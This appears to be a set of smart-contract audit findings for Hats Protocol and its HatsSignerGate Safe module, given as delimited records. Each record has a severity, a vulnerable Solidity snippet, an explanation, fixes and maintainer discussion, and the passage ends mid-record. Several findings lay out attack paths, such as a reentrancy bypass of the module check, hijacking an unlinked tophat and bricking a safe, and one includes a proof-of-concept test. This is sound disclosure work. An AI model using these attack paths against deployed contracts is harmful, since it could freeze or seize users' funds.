Swap Signer fails if final owner is invalid due to off by one error in loopчmediumч```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n    if (!swapped) {\n        // if there are no invalid owners, we can't add a new signer, so we revert\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\nч"New users attempting to call `claimSigner()` when there is already a full slate of owners are supposed to kick any invalid owners off the safe in order to swap in and take their place. However, the loop that checks this has an off-by-one error that misses checking the final owner.\nWhen `claimSigner()` is called, it adds the `msg.sender` as a signer, as long as there aren't already too many owners on the safe.\nHowever, in the case that there are already the maximum number of owners on the safe, it performs a check whether any of them are invalid. If they are, it swaps out the invalid owner for the new owner.\n```\nif (ownerCount >= maxSigs) {\n    bool swapped = _swapSigner(owners, ownerCount, maxSigs, currentSignerCount, msg.sender);\n    if (!swapped) {\n        // if there are no invalid owners, we can't add a new signer, so we revert\n        revert NoInvalidSignersToReplace();\n    }\n}\n```\n\n```\nfunction _swapSigner(\n    address[] memory _owners,\n    uint256 _ownerCount,\n    uint256 _maxSigners,\n    uint256 _currentSignerCount,\n    address _signer\n) internal returns (bool success) {\n    address ownerToCheck;\n    bytes memory data;\n\n    for (uint256 i; i < _ownerCount - 1;) {\n        ownerToCheck = _owners[i];\n\n        if (!isValidSigner(ownerToCheck)) {\n            // prep the swap\n            data = abi.encodeWithSignature(\n                ""swapOwner(address,address,address)"",\n                _findPrevOwner(_owners, ownerToCheck), // prevOwner\n                ownerToCheck, // oldOwner\n                _signer // newOwner\n            );\n\n            // execute the swap, reverting if it fails for some reason\n            success = safe.execTransactionFromModule(\n                address(safe), // to\n                0, // value\n                data, // data\n                Enum.Operation.Call // operation\n            );\n\n            if (!success) {\n                revert FailedExecRemoveSigner();\n            }\n\n            if (_currentSignerCount < _maxSigners) ++signerCount;\n            break;\n        }\n        unchecked {\n            ++i;\n        }\n    }\n}\n```\n\nThis function is intended to iterate through all the owners, check if any is no longer valid, and — if that's the case — swap it for the new one.\nHowever, in the case that all owners are valid except for the final one, it will miss the swap and reject the new owner.\nThis is because there is an off by one error in the loop, where it iterates through `for (uint256 i; i < _ownerCount - 1;)...`\nThis only iterates through all the owners up until the final one, and will miss the check for the validity and possible swap of the final owner."чPerform the loop with `ownerCount` instead of `ownerCount` - 1 to check all owners:\n```\n// Remove the line below\n for (uint256 i; i < _ownerCount // Remove the line below\n 1;) {\n// Add the line below\n for (uint256 i; i < _ownerCount ;) {\n     ownerToCheck = _owners[i];\n    // rest of code\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/12чWhen only the final owner is invalid, new users will not be able to claim their role as signer, even through they should.\nCode Snippet\nTool used\nManual Review
targetThreshold can be set below minThreshold, violating important invariantчmediumч```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n\n    minThreshold = _minThreshold;\n}\n```\nчThere are protections in place to ensure that `minThreshold` is not set above `targetThreshold`, because the result is that the max threshold on the safe would be less than the minimum required. However, this check is not performed when `targetThreshold` is set, which results in the same situation.\n```\nfunction _setMinThreshold(uint256 _minThreshold) internal {\n    if (_minThreshold > maxSigners || _minThreshold > targetThreshold) {\n        revert InvalidMinThreshold();\n    }\n\n    minThreshold = _minThreshold;\n}\n```\n\nHowever, when `targetThreshold` is set, there is no equivalent check that it remains above minThreshold:\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n\n    targetThreshold = _targetThreshold;\n}\n```\n\nThis is a major problem, because if it is set lower than `minThreshold`, `reconcileSignerCount()` will set the safe's threshold to be this value, which is lower than the minimum, and will cause all tranasctions to fail.чPerform a check in `_setTargetThreshold()` that it is greater than or equal to minThreshold:\n```\nfunction _setTargetThreshold(uint256 _targetThreshold) internal {\n// Add the line below\n   if (_targetThreshold < minThreshold) {\n// Add the line below\n     revert InvalidTargetThreshold();\n// Add the line below\n   }\n    if (_targetThreshold > maxSigners) {\n        revert InvalidTargetThreshold();\n    }\n\n    targetThreshold = _targetThreshold;\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/8чSettings that are intended to be guarded are not, which can lead to parameters being set in such a way that all transactions fail.\nCode Snippet\nTool used\nManual Review
Hats can be overwrittenчmediumч```\n    function _createHat(\n        uint256 _id,\n        string calldata _details,\n        uint32 _maxSupply,\n        address _eligibility,\n        address _toggle,\n        bool _mutable,\n        string calldata _imageURI\n    ) internal returns (Hat memory hat) {\n        hat.details = _details;\n        hat.maxSupply = _maxSupply;\n        hat.eligibility = _eligibility;\n        hat.toggle = _toggle;\n        hat.imageURI = _imageURI;\n        hat.config = _mutable ? uint96(3 << 94) : uint96(1 << 95);\n        _hats[_id] = hat;\n\n\n        emit HatCreated(_id, _details, _maxSupply, _eligibility, _toggle, _mutable, _imageURI);\n    }\n```\nчChild hats can be created under a non-existent admin. Creating the admin allows overwriting the properties of the child-hats, which goes against the immutability of hats.\n```\n    function _createHat(\n        uint256 _id,\n        string calldata _details,\n        uint32 _maxSupply,\n        address _eligibility,\n        address _toggle,\n        bool _mutable,\n        string calldata _imageURI\n    ) internal returns (Hat memory hat) {\n        hat.details = _details;\n        hat.maxSupply = _maxSupply;\n        hat.eligibility = _eligibility;\n        hat.toggle = _toggle;\n        hat.imageURI = _imageURI;\n        hat.config = _mutable ? uint96(3 << 94) : uint96(1 << 95);\n        _hats[_id] = hat;\n\n\n        emit HatCreated(_id, _details, _maxSupply, _eligibility, _toggle, _mutable, _imageURI);\n    }\n```\n\nNow, the next eligible hat for this admin is 1.1.1, which is a hat that was already created and minted. This can allow the admin to change the properties of the child, even if the child hat was previously immutable. This contradicts the immutability of hats, and can be used to rug users in multiple ways, and is thus classified as high severity. This attack can be carried out by any hat wearer on their child tree, mutating their properties.ч"Check if admin exists, before minting by checking any of its properties against default values\n```\nrequire(_hats[admin].maxSupply > 0, ""Admin not created"")\n```\n\nDiscussion\nspengrah\nThe ability for an admin to skip levels when creating hats is a desired feature. However, we definitely do not want those hats to be able to overwritten if/when the skipped admins are created. Therefore, what we need to do is not overwrite a hat's `lastHatId` property when creating it.\nFor example, add something like the following to _createHat:\n```\nuint16 lastId = hat.lastHatId;\nif (lastId > 0) hat.lastHatId = lastId;\n```\n\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/109"чCode Snippet\nThe attack can be demonstrated with the following code which carries out the following steps:\nChild 1.1.1 is created with max supply 10, and false mutability. Thus its properties should be locked.\nAdmin 1.1.0 is created\nChild 1.1.1 is re-created, now with supply of 20, overwriting its previous instance\nThe children are shown to be on the same hatId, and their max supplies are shown to be different values.\n```\nfunction testATTACKoverwrite() public {\n        vm.startPrank(address(topHatWearer));\n        uint256 emptyAdmin = hats.getNextId(topHatId);\n        uint256 child1 = hats.createHat(\n            emptyAdmin,\n            _details,\n            10,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        (, uint256 maxsup, , , , , , , ) = hats.viewHat(child1);\n        assertEq(maxsup, 10);\n        hats.createHat(\n            topHatId,\n            _details,\n            _maxSupply,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        uint256 child2 = hats.createHat(\n            emptyAdmin,\n            _details,\n            20,\n            _eligibility,\n            _toggle,\n            false,\n            secondHatImageURI\n        );\n        (,  maxsup, , , , , , , ) = hats.viewHat(child1);\n        assertEq(child1, child2);\n        assertEq(maxsup, 20);\n    }\n```\n\nTool used\nManual Review
Unlinked tophat retains linkedTreeRequests, can be ruggedчhighч```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\nч"When a tophat is unlinked from its admin, it is intended to regain its status as a tophat that is fully self-sovereign. However, because the `linkedTreeRequests` value isn't deleted, an independent tophat could still be vulnerable to ""takeover"" from another admin and could lose its sovereignty.\nFor a tophat to get linked to a new tree, it calls `requestLinkTopHatToTree()` function:\n```\nfunction requestLinkTopHatToTree(uint32 _topHatDomain, uint256 _requestedAdminHat) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n\n    _checkAdmin(fullTopHatId);\n\n    linkedTreeRequests[_topHatDomain] = _requestedAdminHat;\n    emit TopHatLinkRequested(_topHatDomain, _requestedAdminHat);\n}\n```\n\nThis creates a ""request"" to link to a given admin, which can later be approved by the admin in question:\n```\nfunction approveLinkTopHatToTree(uint32 _topHatDomain, uint256 _newAdminHat) external {\n    // for everything but the last hat level, check the admin of `_newAdminHat`'s theoretical child hat, since either wearer or admin of `_newAdminHat` can approve\n    if (getHatLevel(_newAdminHat) < MAX_LEVELS) {\n        _checkAdmin(buildHatId(_newAdminHat, 1));\n    } else {\n        // the above buildHatId trick doesn't work for the last hat level, so we need to explicitly check both admin and wearer in this case\n        _checkAdminOrWearer(_newAdminHat);\n    }\n\n    // Linkages must be initiated by a request\n    if (_newAdminHat != linkedTreeRequests[_topHatDomain]) revert LinkageNotRequested();\n\n    // remove the request -- ensures all linkages are initialized by unique requests,\n    // except for relinks (see `relinkTopHatWithinTree`)\n    delete linkedTreeRequests[_topHatDomain];\n\n    // execute the link. Replaces existing link, if any.\n    _linkTopHatToTree(_topHatDomain, _newAdminHat);\n}\n```\n\nThis function shows that if there is a pending `linkedTreeRequests`, then the admin can use that to link the tophat into their tree and claim authority over it.\nWhen a tophat is unlinked, it is expected to regain its sovereignty:\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```\n\nHowever, this function does not delete `linkedTreeRequests`.\nTherefore, the following set of actions is possible:\nTopHat is linked to Admin A\nAdmin A agrees to unlink the tophat\nAdmin A calls `requestLinkTopHatToTree` with any address as the admin\nThis call succeeds because Admin A is currently an admin for TopHat\nAdmin A unlinks TopHat as promised\nIn the future, the address chosen can call `approveLinkTopHatToTree` and take over admin controls for the TopHat without the TopHat's permission"чIn `unlinkTopHatFromTree()`, the `linkedTreeRequests` should be deleted:\n```\nfunction unlinkTopHatFromTree(uint32 _topHatDomain) external {\n    uint256 fullTopHatId = uint256(_topHatDomain) << 224; // (256 - TOPHAT_ADDRESS_SPACE);\n    _checkAdmin(fullTopHatId);\n\n    delete linkedTreeAdmins[_topHatDomain];\n// Add the line below\n   delete linkedTreeRequests[_topHatDomain];\n    emit TopHatLinked(_topHatDomain, 0);\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-protocol/pull/113чTophats that expect to be fully self-sovereign and without any oversight can be surprisingly claimed by another admin, because settings from a previous admin remain through unlinking.\nCode Snippet\nTool used\nManual Review
Safe can be bricked because threshold is updated with validSignerCount instead of newThresholdчhighч```\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\n```\nчThe safe's threshold is supposed to be set with the lower value of the `validSignerCount` and the `targetThreshold` (intended to serve as the maximum). However, the wrong value is used in the call to the safe's function, which in some circumstances can lead to the safe being permanently bricked.\nIn `reconcileSignerCount()`, the valid signer count is calculated. We then create a value called `newThreshold`, and set it to the minimum of the valid signer count and the target threshold. This is intended to be the value that we update the safe's threshold with.\n```\nif (validSignerCount <= target && validSignerCount != currentThreshold) {\n    newThreshold = validSignerCount;\n} else if (validSignerCount > target && currentThreshold < target) {\n    newThreshold = target;\n}\n```\n\nHowever, there is a typo in the contract call, which accidentally uses `validSignerCount` instead of `newThreshold`.\nThe result is that, if there are more valid signers than the `targetThreshold` that was set, the threshold will be set higher than intended, and the threshold check in `checkAfterExecution()` will fail for being above the max, causing all safe transactions to revert.\nThis is a major problem because it cannot necessarily be fixed. In the event that it is a gate with a single hat signer, and the eligibility module for the hat doesn't have a way to turn off eligibility, there will be no way to reduce the number of signers. If this number is greater than `maxSigners`, there is no way to increase `targetThreshold` sufficiently to stop the reverting.\nThe result is that the safe is permanently bricked, and will not be able to perform any transactions.ч"Change the value in the function call from `validSignerCount` to `newThreshold`.\n```\nif (newThreshold > 0) {\n// Remove the line below\n    bytes memory data = abi.encodeWithSignature(""changeThreshold(uint256)"", validSignerCount);\n// Add the line below\n    bytes memory data = abi.encodeWithSignature(""changeThreshold(uint256)"", newThreshold);\n\n    bool success = safe.execTransactionFromModule(\n        address(safe), // to\n        0, // value\n        data, // data\n        Enum.Operation.Call // operation\n    );\n\n    if (!success) {\n        revert FailedExecChangeThreshold();\n    }\n}\n```\n\nDiscussion\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/9"чAll transactions will revert until `validSignerCount` can be reduced back below `targetThreshold`, which re\nCode Snippet\nTool used\nManual Review
Signers can bypass checks to add new modules to a safe by abusing reentrancyчhighч```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\nчThe `checkAfterExecution()` function has checks to ensure that new modules cannot be added by signers. This is a crucial check, because adding a new module could give them unlimited power to make any changes (with no guards in place) in the future. However, by abusing reentrancy, the parameters used by the check can be changed so that this crucial restriction is violated.\nThe `checkAfterExecution()` is intended to uphold important invariants after each signer transaction is completed. This is intended to restrict certain dangerous signer behaviors, the most important of which is adding new modules. This was an issue caught in the previous audit and fixed by comparing the hash of the modules before execution to the has of the modules after.\nBefore:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nThis is further emphasized in the comments, where it is specified:\n/// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\nWhy Restricting Modules is Important\nModules are the most important thing to check. This is because modules have unlimited power not only to execute transactions but to skip checks in the future. Creating an arbitrary new module is so bad that it is equivalent to the other two issues together: getting complete control over the safe (as if threshold was set to 1) and removing the guard (because they aren't checked in module transactions).\nHowever, this important restriction can be violated by abusing reentrancy into this function.\nReentrancy Disfunction\nTo see how this is possible, we first have to take a quick detour regarding reentrancy. It appears that the protocol is attempting to guard against reentrancy with the `guardEntries` variable. It is incremented in `checkTransaction()` (before a transaction is executed) and decremented in `checkAfterExecution()` (after the transaction has completed).\nThe only protection it provides is in its risk of underflowing, explained in the comments as:\n// leave checked to catch underflows triggered by re-erntry attempts\nHowever, any attempt to reenter and send an additional transaction midstream of another transaction would first trigger the `checkTransaction()` function. This would increment `_guardEntries` and would lead to it not underflowing.\nIn order for this system to work correctly, the `checkTransaction()` function should simply set `_guardEntries = 1`. This would result in an underflow with the second decrement. But, as it is currently designed, there is no reentrancy protection.\nUsing Reentrancy to Bypass Module Check\nRemember that the module invariant is upheld by taking a snapshot of the hash of the modules in `checkTransaction()` and saving it in the `_existingModulesHash` variable.\nHowever, imagine the following set of transactions:\nSigners send a transaction via the safe, and modules are snapshotted to `_existingModulesHash`\nThe transaction uses the Multicall functionality of the safe, and performs the following actions:\nFirst, it adds the malicious module to the safe\nThen, it calls `execTransaction()` on itself with any another transaction\nThe second call will call `checkTransaction()`\nThis will update `_existingModulesHash` to the new list of modules, including the malicious one\nThe second call will execute, which doesn't matter (could just be an empty transaction)\nAfter the transaction, `checkAfterExecution()` will be called, and the modules will match\nAfter the full transaction is complete, `checkAfterExecution()` will be called for the first transaction, but since `_existingModulesHash` will be overwritten, the module check will passчUse a more typical reentrancy guard format, such as checking to ensure `_guardEntries == 0` at the top of `checkTransaction()` or simply setting `_guardEntries = 1` in `checkTransaction()` instead of incrementing it.\nDiscussion\nzobront\nEscalate for 10 USDC\nTo successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit.\n#67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n#105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it.\nMy recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\nsherlock-admin\nEscalate for 10 USDC\nTo successfully duplicate a High Severity issue, it is required for an issue to meet a burden of proof of understanding the exploit.\n#67 clearly meets this burden of proof. It explains the same exploit described in this report and deserves to be duplicated with it.\n#105 and #124 do not explain any exploit. They simply noticed that the reentrancy guard wouldn't work, couldn't find a way to take advantage of that, and submitted it without a way to use it.\nMy recommendation is that they are not valid issues, but at the very least they should be moved to a separate Medium issue to account for the fact that they did not find a High Severity exploit.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ncducrest\nIt's a bit ambitious to have 4 issues describing the same line of codes as incorrect / vulnerable not being marked as duplicate, especially when they provide the same recommendation. I feel like going into such depths to describe the impact may not be necessary to ensure the safety of the protocol.\nHowever, I agree that it can also feel weird that we would be awarded the same while your issue provides much more details. I could not find anything in the Sherlock docs pertaining to this situation, but maybe there should be a reward for the best issue describing a vulnerability.\nWhen first submitting these issues, I feel like I may take the risk that the issue is treated as medium / low by not providing enough details. Perhaps are you already awarded for having provided such details by ensuring your issue is considered valid?\nhrishibhat\nEscalation accepted\nGiven that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue.\nNote: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\nsherlock-admin\nEscalation accepted\nGiven that issues #41 & #67 have identified a valid attack path, considering #105 & #124 as a medium as it identifies underlying re-entrancy issue.\nNote: Sherlock will make note of the above comments and discuss internally to add additional instructions in the guide to help resolve such scenarios in the future.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.чAny number of signers who are above the threshold will be able to give themselves unlimited access over the safe with no restriction going forward.\nCode Snippet\nTool used\nManual Review
If another module adds a module, the safe will be brickedчhighч```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\nч"If a module is added by another module, it will bypass the `enableNewModule()` function that increments `enabledModuleCount`. This will throw off the module validation in `checkTransaction()` and `checkAfterExecution()` and could cause the safe to become permanently bricked.\nIn order to ensure that signers cannot add new modules to the safe (thus giving them unlimited future governing power), the guard portion of the gate checks that the hash of the modules before the transaction is the same as the hash after.\nBefore:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount);\n_existingModulesHash = keccak256(abi.encode(modules));\n```\n\nAfter:\n```\n(address[] memory modules,) = safe.getModulesPaginated(SENTINEL_OWNERS, enabledModuleCount + 1);\nif (keccak256(abi.encode(modules)) != _existingModulesHash) {\n    revert SignersCannotChangeModules();\n}\n```\n\nYou'll note that the ""before"" check uses `enabledModuleCount` and the ""after"" check uses `enabledModuleCount + 1`. The reason for this is that we want to be able to catch whether the user added a new module, which requires us taking a larger pagination to make sure we can view the additional module.\nHowever, if we were to start with a number of modules larger than `enabledModuleCount`, the result would be that the ""before"" check would clip off the final modules, and the ""after"" check would include them, thus leading to different hashes.\nThis situation can only arise if a module is added that bypasses the `enableModule()` function. But this exact situation can happen if one of the other modules on the safe adds a module to the safe.\nIn this case, the modules on the safe will increase but `enabledModuleCount` will not. This will lead to the ""before"" and ""after"" checks returning different arrays each time, and therefore disallowing transactions.\nThe only possible ways to fix this problem will be to have the other module remove the additional one they added. But, depending on the specific circumstances, this option may not be possible. For example, the module that performed the adding may not have the ability to remove modules."чThe module guarding logic needs to be rethought. Given the large number of unbounded risks it opens up, I would recommend not allowing other modules on any safes that use this functionality.\nDiscussion\nspengrah\nThis is definitely an issue. I can see a few potential approaches to addressing it:\nAs suggested, allow no other modules to exist alongside HSG. That would require checks in the factory as well as in `checkAfterExecution`. This approach would eliminate this issue fully, but would reduce flexibility for DAOs to customize how they use their Safes. For example, a common expected pattern is to use a Safe alongside a DAO that both the DAO (via a module; slow) and signers (via sigs; fast) can control. This wouldn't be possible if no additional modules could be added.\nAdd an onlyOwner `removeModules` function to enable the owner to true up the module count saved in storage if a module is added to the Safe via a different avenue.\nIn `checkTransaction`, count and store the number of modules that exist on the safe, then use that value as the page size for the check in `checkAfterExecution`. This would allow the Safe to have arbitrary number of modules, but for larger number of modules the gas size be fairly high — in `checkTransaction` we'd need to get the module addresses from the Safe in a while loop to ensure we count all of them.\ncc @zobront\nspengrah\nGoing with option 1 here\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/10чThe safe can be permanently bricked, with the guard functions disallowing any transactions. All funds in the safe will remain permanently stuck.\nCode Snippet\nTool used\nManual Review
Signers can brick safe by adding unlimited additional signers while avoiding checksчhighч```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\nчThere are a number of checks in `checkAfterExecution()` to ensure that the signers cannot perform any illegal actions to exert too much control over the safe. However, there is no check to ensure that additional owners are not added to the safe. This could be done in a way that pushes the total over `maxSigners`, which will cause all future transactions to revert.\nThis means that signers can easily collude to freeze the contract, giving themselves the power to hold the protocol ransom to unfreeze the safe and all funds inside it.\nWhen new owners are added to the contract through the `claimSigner()` function, the total number of owners is compared to `maxSigners` to ensure it doesn't exceed it.\nHowever, owners can also be added by a normal `execTransaction` function. In this case, there are very few checks (all of which could easily or accidentally be missed) to stop us from adding too many owners:\n```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\n\nThat means that either in the case that (a) the safe's threshold is already at `targetThreshold` or (b) the owners being added are currently toggled off or have eligibility turned off, this check will pass and the owners will be added.\nOnce they are added, all future transactions will fail. Each time a transaction is processed, `checkTransaction()` is called, which calls `reconcileSignerCount()`, which has the following check:\n```\nif (validSignerCount > maxSigners) {\n    revert MaxSignersReached();\n}\n```\n\nThis will revert as long as the new owners are now activated as valid signers.\nIn the worst case scenario, valid signers wearing an immutable hat are added as owners when the safe's threshold is already above `targetThreshold`. The check passes, but the new owners are already valid signers. There is no admin action that can revoke the validity of their hats, so the `reconcileSignerCount()` function will always revert, and therefore the safe is unusable.\nSince `maxSigners` is immutable and can't be changed, the only solution is for the hat wearers to renounce their hats. Otherwise, the safe will remain unusable with all funds trapped inside.чThere should be a check in `checkAfterExecution()` that ensures that the number of owners on the safe has not changed throughout the execution.\nIt also may be recommended that the `maxSigners` value is adjustable by the contract owner.\nDiscussion\nspengrah\nThere is no admin action that can revoke the validity of their hats, so the reconcileSignerCount() function will always revert, and therefore the safe is unusable.\nThis is not fully true, since either the hat's eligibility or toggle module could revoke their hat. But this is definitely not guaranteed to be possible, especially in the case of mechanistic modules that have hardcoded revocation logic, so addressing this issue is warranted.\nMy current thinking is that storing/comparing the full owner array — which is likely necessary to address #118 and #70 — would also address this issue, since ensuring exact same owners also ensures same number of owners.\ncc @zobront\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/5чSigners can easily collude to freeze the contract, giving themselves the power to hold the protocol ransom to unfreeze the safe and all funds inside it.\nIn a less malicious case, signers might accidentally add too many owners and end up needing to manage the logistics of having users renounce their hats.\nCode Snippet\nTool used\nManual Review
HatsSignerGate + MultiHatsSignerGate: more than maxSignatures can be claimed which leads to DOS in reconcileSignerCountчhighч```\n        // 9 >= 10 is false\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n        // msg.sender is a new signer so he is not yet owner\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n        // msg.sender is a valid signer, he wears the signer hat\n        if (!isValidSigner(msg.sender)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n```\nчThe `HatsSignerGate.claimSigner` and `MultiHatsSignerGate.claimSigner` functions allow users to become signers.\nIt is important that both functions do not allow that there exist more valid signers than `maxSigners`.\nThis is because if there are more valid signers than `maxSigners`, any call to `HatsSignerGateBase.reconcileSignerCount` reverts, which means that no transactions can be executed.\nThe only possibility to resolve this is for a valid signer to give up his signer hat. No signer will voluntarily give up his signer hat. And it is wrong that a signer must give it up. Valid signers that have claimed before `maxSigners` was reached should not be affected by someone trying to become a signer and exceeding `maxSigners`. In other words the situation where one of the signers needs to give up his signer hat should have never occurred in the first place.\nThink of the following scenario:\n`maxSignatures=10` and there are 10 valid signers\nThe signers execute a transaction that calls `Safe.addOwnerWithThreshold` such that there are now 11 owners (still there are 10 valid signers)\nOne of the 10 signers is no longer a wearer of the hat and `reconcileSignerCount` is called. So there are now 9 valid signers and 11 owners\nThe signer that was no longer a wearer of the hat in the previous step now wears the hat again. However `reconcileSignerCount` is not called. So there are 11 owners and 10 valid signers. The HSG however still thinks there are 9 valid signers.\nWhen a new signer now calls `claimSigner`, all checks will pass and he will be swapped for the owner that is not a valid signer:\n```\n        // 9 >= 10 is false\n        if (currentSignerCount >= maxSigs) {\n            revert MaxSignersReached();\n        }\n\n        // msg.sender is a new signer so he is not yet owner\n        if (safe.isOwner(msg.sender)) {\n            revert SignerAlreadyClaimed(msg.sender);\n        }\n\n        // msg.sender is a valid signer, he wears the signer hat\n        if (!isValidSigner(msg.sender)) {\n            revert NotSignerHatWearer(msg.sender);\n        }\n```\n\nSo there are now 11 owners and 11 valid signers. This means when `reconcileSignerCount` is called, the following lines cause a revert:\n```\n    function reconcileSignerCount() public {\n        address[] memory owners = safe.getOwners();\n        uint256 validSignerCount = _countValidSigners(owners);\n\n        // 11 > 10\n        if (validSignerCount > maxSigners) {\n            revert MaxSignersReached();\n        }\n```\nч
Signers can bypass checks and change threshold within a transactionчhighч```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n```\nчThe `checkAfterExecution()` function has checks to ensure that the safe's threshold isn't changed by a transaction executed by signers. However, the parameters used by the check can be changed midflight so that this crucial restriction is violated.\nThe `checkAfterExecution()` is intended to uphold important invariants after each signer transaction is completed. This is intended to restrict certain dangerous signer behaviors. From the docs:\n/// @notice Post-flight check to prevent `safe` signers from removing this contract guard, changing any modules, or changing the threshold\nHowever, the restriction that the signers cannot change the threshold can be violated.\nTo see how this is possible, let's check how this invariant is upheld. The following check is performed within the function:\n```\nif (safe.getThreshold() != _getCorrectThreshold()) {\n    revert SignersCannotChangeThreshold();\n}\n```\n\nIf we look up `_getCorrectThreshold()`, we see the following:\n```\nfunction _getCorrectThreshold() internal view returns (uint256 _threshold) {\n    uint256 count = _countValidSigners(safe.getOwners());\n    uint256 min = minThreshold;\n    uint256 max = targetThreshold;\n    if (count < min) _threshold = min;\n    else if (count > max) _threshold = max;\n    else _threshold = count;\n}\n```\n\nAs we can see, this means that the safe's threshold after the transaction must equal the valid signers, bounded by the `minThreshold` and `maxThreshold`.\nHowever, this check does not ensure that the value returned by `_getCorrectThreshold()` is the same before and after the transaction. As a result, as long as the number of owners is also changed in the transaction, the condition can be upheld.\nTo illustrate, let's look at an example:\nBefore the transaction, there are 8 owners on the vault, all signers. targetThreshold == 10 and minThreshold == 2, so the safe's threshold is 8 and everything is good.\nThe transaction calls `removeOwner()`, removing an owner from the safe and adjusting the threshold down to 7.\nAfter the transaction, there will be 7 owners on the vault, all signers, the safe's threshold will be 7, and the check will pass.\nThis simple example focuses on using `removeOwner()` once to decrease the threshold. However, it is also possible to use the safe's multicall functionality to call `removeOwner()` multiple times, changing the threshold more dramatically.ч"Save the safe's current threshold in `checkTransaction()` before the transaction has executed, and compare the value after the transaction to that value from storage.\nDiscussion\nspengrah\nIn one sense, this is sort of ok since we're still always ensuring that the threshold is ""correct"" based on the number of valid signers on the safe, and changing the threshold doesn't allow . If a valid signer is removed by a safe tx, they can re-claim and then everything is back to the way it was.\nBut in another sense, it does make it fairly difficult to conceptualize the system, and it would also be ideal to successfully follow the documentation 😉. In all, I think this is more of a medium severity.\nThe suggested solution should work, but likely isn't needed if we're also storing/comparing the full owner array in order to address #118 and #70.\ncc @zobront\nspengrah\nWithdrawing the severity dispute since it would be quite painful if the signers continuously replaced existing signers to reach max signers, which could prevent replaced signers from reclaiming.\nspengrah\nhttps://github.com/Hats-Protocol/hats-zodiac/pull/5\nzobront\n@spengrah I believe this is still possible, if the safe is able to tamper with hat status or wearer eligibility and then reduce the threshold.\nIf this seems ok to you, then make sure to change the wording if your documentation and comments to not imply this isn't possible. If it's not ok with you, then I'd recommend implementing the recommended fix from this 